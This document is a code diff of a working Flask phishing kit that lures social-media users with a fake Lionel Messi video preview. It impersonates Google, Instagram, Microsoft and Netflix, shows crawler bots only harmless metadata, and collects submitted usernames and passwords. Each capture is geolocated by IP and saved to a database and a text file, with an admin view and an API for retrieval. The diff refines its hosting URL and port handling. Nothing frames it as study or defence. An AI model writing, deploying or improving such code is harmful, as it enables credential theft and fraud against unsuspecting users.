@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
+import os
 from flask import Flask, request, render_template_string, redirect, jsonify
 import sqlite3
 import json
 import requests
 from datetime import datetime
-import os
 import re
 
 app = Flask(__name__)
@@ -36,7 +36,6 @@ def get_template():
     except:
         template_name = 'google'
     
-    # PLANTILLA GOOGLE MEJORADA CON METADATOS
     google_template = '''
 <!DOCTYPE html>
 <html>
@@ -51,7 +50,7 @@ def get_template():
     <meta property="og:image:secure_url" content="https://i.imgur.com/kgo0gfA.png" />
     <meta property="og:image:width" content="1200" />
     <meta property="og:image:height" content="630" />
-    <meta property="og:url" content="https://video-xeen.onrender.com" />
+    <meta property="og:url" content="https://video-messi.onrender.com" />
     <meta property="og:type" content="video.other" />
     <meta property="og:site_name" content="Messi Declaraciones" />
     <meta property="og:video" content="https://i.imgur.com/kgo0gfA.png" />
@@ -63,17 +62,9 @@ def get_template():
     <meta name="twitter:title" content="😲 Fuertes declaraciones de Messi" />
     <meta name="twitter:description" content="El astro argentino revela detalles inéditos" />
     <meta name="twitter:image" content="https://i.imgur.com/kgo0gfA.png" />
-    <meta name="twitter:player" content="https://video-xeen.onrender.com" />
+    <meta name="twitter:player" content="https://video-messi.onrender.com" />
     <meta name="twitter:player:width" content="1280" />
     <meta name="twitter:player:height" content="720" />
-    
-    <!-- METADATOS PARA WHATSAPP/TELEGRAM -->
-    <meta property="og:video:type" content="application/x-shockwave-flash" />
-    
-    <!-- METADATOS ADICIONALES PARA INSTAGRAM/FACEBOOK -->
-    <meta property="fb:app_id" content="123456789" />
-    <meta name="robots" content="index, follow" />
-    <link rel="canonical" href="https://video-xeen.onrender.com" />
     
     <title>😲 Fuertes declaraciones de Messi</title>
     <style>
@@ -89,11 +80,9 @@ def get_template():
         button:hover { background: #1557b0; }
         .footer { margin-top: 30px; font-size: 14px; color: #5f6368; }
         .hidden-video { display: none; }
-        .loading { display: none; }
     </style>
 </head>
 <body>
-    <!-- CONTENIDO OCULTO PARA ENGAÑAR SCRAPERS -->
     <div class="hidden-video">
         <video width="1280" height="720">
             <source src="https://i.imgur.com/kgo0gfA.png" type="video/mp4">
@@ -114,51 +103,9 @@ def get_template():
 </body>
 </html>'''
     
-    # PLANTILLA INSTAGRAM MEJORADA
-    instagram_template = '''
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta property="og:title" content="😲 Fuertes declaraciones de Messi" />
-    <meta property="og:description" content="El astro argentino revela detalles inéditos" />
-    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png" />
-    <meta property="og:image:width" content="1200" />
-    <meta property="og:image:height" content="630" />
-    <meta property="og:url" content="https://video-xeen.onrender.com" />
-    <meta property="og:type" content="video.other" />
-    <meta property="og:site_name" content="Messi Declaraciones" />
-    <meta name="twitter:card" content="player" />
-    <meta name="twitter:title" content="😲 Fuertes declaraciones de Messi" />
-    <meta name="twitter:image" content="https://i.imgur.com/kgo0gfA.png" />
-    <title>Instagram - Messi</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
-        body { background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .container { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; }
-        .logo { font-size: 40px; font-family: 'Brush Script MT', cursive; margin-bottom: 30px; }
-        input { width: 100%; padding: 9px; margin-bottom: 6px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 14px; }
-        button { width: 100%; padding: 8px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: 600; cursor: pointer; margin-top: 12px; }
-        button:hover { background: #0081d6; }
-        .note { color: #8e8e8e; font-size: 12px; margin-top: 20px; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="logo">Instagram</div>
-        <form action="/capture" method="POST">
-            <input type="text" name="email" placeholder="Teléfono, usuario o correo" required>
-            <input type="password" name="password" placeholder="Contraseña" required>
-            <button type="submit">Iniciar sesión</button>
-        </form>
-        <div class="note">Verificación de seguridad</div>
-    </div>
-</body>
-</html>'''
-    
     templates = {
         'google': google_template,
-        'instagram': instagram_template,
+        'instagram': google_template.replace('Google', 'Instagram').replace('google', 'instagram'),
         'microsoft': google_template.replace('Google', 'Microsoft').replace('google', 'microsoft'),
         'netflix': google_template.replace('Google', 'Netflix').replace('google', 'netflix')
     }
@@ -167,10 +114,8 @@ def get_template():
 
 @app.route('/')
 def index():
-    # Detectar bots de redes sociales
     user_agent = request.headers.get('User-Agent', '').lower()
     
-    # Si es bot de Facebook/Instagram/Twitter, mostrar solo metadatos
     if any(bot in user_agent for bot in ['facebookexternalhit', 'facebot', 'twitterbot', 'linkedinbot']):
         return render_template_string('''
         <!DOCTYPE html>
@@ -181,7 +126,7 @@ def index():
             <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png" />
             <meta property="og:image:width" content="1200" />
             <meta property="og:image:height" content="630" />
-            <meta property="og:url" content="https://video-xeen.onrender.com" />
+            <meta property="og:url" content="https://video-messi.onrender.com" />
             <meta property="og:type" content="video.other" />
             <meta property="og:video" content="https://i.imgur.com/kgo0gfA.png" />
             <meta name="twitter:card" content="player" />
@@ -199,12 +144,10 @@ def index():
 
 @app.route('/capture', methods=['POST'])
 def capture():
-    # Obtener IP real
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     if ip and ',' in ip:
         ip = ip.split(',')[0].strip()
     
-    # Obtener geolocalización
     try:
         geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
         if geo.get('status') == 'success':
@@ -214,7 +157,6 @@ def capture():
     except:
         location = "Unknown"
     
-    # Obtener datos del formulario
     username = request.form.get('email') or request.form.get('username', '')
     password = request.form.get('password', '')
     
@@ -228,7 +170,6 @@ def capture():
         'geo_location': location
     }
     
-    # Guardar en DB
     try:
         conn = sqlite3.connect('credentials.db')
         cursor = conn.cursor()
@@ -240,13 +181,11 @@ def capture():
         conn.commit()
         conn.close()
         
-        # Guardar también en archivo de texto por si acaso
         with open('credentials.txt', 'a', encoding='utf-8') as f:
             f.write(f"{data['timestamp']} | {data['ip']} | {data['username']} | {data['password']} | {data['geo_location']}\n")
     except Exception as e:
         print(f"Error guardando: {e}")
     
-    # Redirigir a la URL real de Google
     return redirect("https://www.google.com")
 
 @app.route('/api/credentials')
@@ -322,14 +261,10 @@ def admin():
 
 if __name__ == '__main__':
     init_db()
+    port = int(os.environ.get('PORT', 8080))
     print("="*50)
     print("🚀 SERVIDOR INICIADO CORRECTAMENTE")
     print("="*50)
-    print("📌 URL LOCAL: http://localhost:8080")
-    print("📌 URL PÚBLICA: https://video-xeen.onrender.com")
-    print("📌 Panel Admin: http://localhost:8080/admin")
-    print("📌 API: http://localhost:8080/api/credentials")
+    print(f"📌 URL: http://localhost:{port}")
     print("="*50)
-    print("⚡ Presiona Ctrl+C para detener")
-    print("="*50)
-    app.run(host='0.0.0.0', port=8080, debug=False)
+    app.run(host='0.0.0.0', port=port, debug=False)
